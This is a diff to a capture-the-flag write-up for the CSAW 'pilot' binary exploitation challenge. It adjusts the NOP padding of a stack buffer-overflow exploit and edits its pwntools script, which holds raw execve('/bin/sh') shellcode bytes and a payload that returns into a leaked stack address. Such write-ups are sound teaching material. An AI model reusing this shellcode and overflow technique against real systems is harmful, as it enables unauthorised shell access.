@@ -83,13 +83,13 @@ Now one thing to note, our shellcode has to be under 32 bytes. The reason for th
  Now our exploit will look like this:
  
  ```
- 8 NOP instructions
+ 4 NOP instructions
  shellcode (24 bytes)
- 8 NOP instruction (really doesn't matter what this us)
+ 12 NOP instruction (really doesn't matter what this us)
 infoleak address (start of our input)
  ```
  
- We will throw 8 NOP instructions (NOP just runs the next instruction) in the beginning, just to give us a little room for error (we shouldn't need it). Then our shellcode will fill up the rest of the 32 bytes. Here is the exploit:
+ We will throw 4 NOP instructions (NOP just runs the next instruction) in the beginning, just to give us a little room for error (we shouldn't need it). Then our shellcode will fill up the rest of the 32 bytes. Here is the exploit:
  
 ```
 #Import pwntools
@@ -101,7 +101,7 @@ context.binary = ELF('pilot')
 #target = remote("pwn.chal.csaw.io", 8464)
 
 #Attach gdb
-#gdb.attach(target)
+#gdb.attach(target, gdbscript = 'b *0x400ae0')
 
 #Print out the initial text
 print target.recvuntil("[*]Good Luck Pilot!....")
@@ -116,12 +116,12 @@ leak = int(leak, 16)
 #Print out the infoleak, then prompt for input as a break
 log.info("The leak is: " + hex(leak))
 print target.recvuntil("[*]Command:", "")
-raw_input()
 
 #Establish the shellcode, the offsets, and the payload
 shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
-offset = "\x90"*(32 - len(shellcode)/2)
-payload = offset + shellcode + offset + p64(leak)
+offset0 = "\x90"*4
+offset1 = "\x90"*12
+payload = offset0 + shellcode + offset1 + p64(leak)
 
 #Send the payload
 target.send(payload)
